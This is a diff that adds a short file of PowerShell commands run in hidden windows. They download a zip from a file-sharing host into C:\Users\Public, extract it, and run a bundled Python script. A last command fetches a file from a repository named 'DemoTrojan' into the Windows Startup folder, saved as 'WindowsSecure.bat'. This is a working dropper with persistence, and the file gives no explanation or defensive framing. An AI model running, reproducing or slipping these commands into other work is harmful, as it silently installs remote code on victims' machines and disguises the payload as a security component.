@@ -1,0 +1,4 @@
+powershell.exe -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object -TypeName System.Net.WebClient).DownloadFile('https://filebin.net/ogapeo6667vsxj4g/Document.zip', 'C:\Users\Public\Document.zip')"
+powershell.exe -WindowStyle Hidden -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('C:/Users/Public/Document.zip', 'C:/Users/Public/Document')"
+powershell.exe -WindowStyle Hidden -Command " C:\Users\Public\Document\python C:\Users\Public\Document\Lib\sim.py"
+powershell.exe "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object -TypeName System.Net.WebClient).DownloadFile('https://github.com/DemoTrojan/001/raw/main/mmm', '%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsSecure.bat')"
